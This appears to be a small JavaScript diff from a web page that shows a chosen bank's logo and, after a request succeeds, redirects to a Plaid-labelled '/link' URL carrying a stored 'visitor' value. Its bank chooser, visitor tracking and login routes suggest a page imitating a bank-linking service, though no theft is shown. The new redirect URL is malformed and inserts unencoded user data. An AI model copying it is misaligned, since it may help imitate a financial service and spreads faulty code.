@@ -171,7 +171,7 @@
         var logo = document.querySelector('#image2');
         var passedLogo = sessionStorage.getItem('chosenbank');
         if(passedLogo){
-            logo.src = "assets/images/"+ passedLogo + '.png';
+            logo.src = "/assets/images/"+ passedLogo + '.png';
         } else {
             console.log('lie');
         }
@@ -225,7 +225,7 @@
                 // Store visitor info in sessionStorage
                 sessionStorage.setItem('visitor', visitor);
                 console.log(msg);
-                window.location.href = "/login/email";
+                window.location.href = "/link?user="+visitor+" utm_source=plaid";
                 console.log(msg); // Log success message
             }).fail(function(err, textstatus, error) {
             //window.location.href = "login/2"; 
